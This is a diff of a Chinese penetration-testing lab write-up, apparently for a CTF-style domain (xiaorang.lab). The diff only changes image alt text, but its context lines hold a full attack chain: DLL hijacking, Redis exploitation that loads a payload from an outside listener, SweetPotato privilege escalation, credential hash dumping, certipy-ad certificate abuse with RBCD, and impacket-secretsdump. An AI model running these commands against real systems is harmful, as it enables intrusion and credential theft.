@@ -82,9 +82,9 @@ python DLLHijacker.py dbghelp.dll
 
 用VS2022载入项目，会提示升级，点确认，靶机出网，准备上线CS，先生成shellcode
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 修改设置(先知那个BYD，他没写)，打开项目属性，
 
@@ -108,9 +108,9 @@ python DLLHijacker.py dbghelp.dll
 - 找到 “生成清单”（Generate Manifest）选项。
 - 设置为 “否 (/MANIFEST:NO)”。
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 应用，编译成dll文件即可
 
@@ -129,7 +129,7 @@ redis-cli -h 39.99.240.173
 bgsave
 ```
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 或者是用RabR，我感觉这个更方便，可以直接上线
 
@@ -139,11 +139,11 @@ python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
 h
 ```
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 成功上线
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 ```bash
 shell dir C:\Users\Administrator\flag\
@@ -164,7 +164,7 @@ shell .\SweetPotato.exe._obf.exe -a "whoami"
 shell C:\Users\Administrator\flag\SweetPotato.exe._obf.exe -a C:\Users\Administrator\flag\beacon.exe
 ```
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 成功上线system，直接新建用户RDP上去
 
@@ -265,7 +265,7 @@ start vulscan
 .\xrkRce.exe -h 172.22.12.31 -t scan
 ```
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 权限足够，直接添加用户上去
 
@@ -291,7 +291,7 @@ net config workstation
 
 CS执行`logonpasswords`，得到机器用户hash，来查询证书
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 ```bash
 proxychains4 certipy-ad find -u 'WIN-YUYAOX9Q$' -hashes 'e611213c6a712f9b18a8d056005a4f0f' -dc-ip 172.22.12.6
@@ -312,7 +312,7 @@ proxychains4 certipy-ad req -u 'TEST4$@xiaorang.lab' -p 'P@ssw0rd' -ca 'xiaorang
 proxychains4 -q certipy-ad auth -pfx win-server.pfx -dc-ip 172.22.12.6
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 没成功，把 PFX 文件转成 `crt` 和 `key`，利用**Pass-The-Cert**来配置RBCD，伪造管理员申请票据
 
@@ -345,7 +345,7 @@ proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SER
 proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SERVER.xiaorang.lab -just-dc-user administrator
 ```
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
 有两个，都试一下
 
